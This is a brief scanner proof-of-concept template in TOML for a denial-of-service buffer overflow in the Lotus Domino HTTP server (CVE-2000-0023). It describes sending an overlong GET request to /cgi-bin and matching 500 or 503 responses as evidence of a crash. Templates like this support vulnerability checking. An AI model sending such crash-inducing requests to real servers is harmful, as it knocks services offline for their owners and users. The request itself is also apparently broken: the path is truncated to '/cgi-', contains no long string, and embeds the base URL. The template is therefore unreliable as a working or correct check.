[info]
author = "ave"
description = "通过向 Lotus Domino HTTP 服务器发送超长 URL 触发缓冲区溢出，导致服务进程崩溃拒绝服务。发送包含大量字符的 GET 请求至 /cgi-bin 路径，验证服务器是否因缓冲区溢出而崩溃。"
id = "POC-AVE-2000-0021"
name = "Lotus Domino HTTP Server Buffer Overflow DoS PoC"
severity = "medium"
tags = ["ave-2000-0021"]
vuln_id = [
    "CVE-2000-0023",
    "AVE-2000-0021",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    503,
]
type = "status"
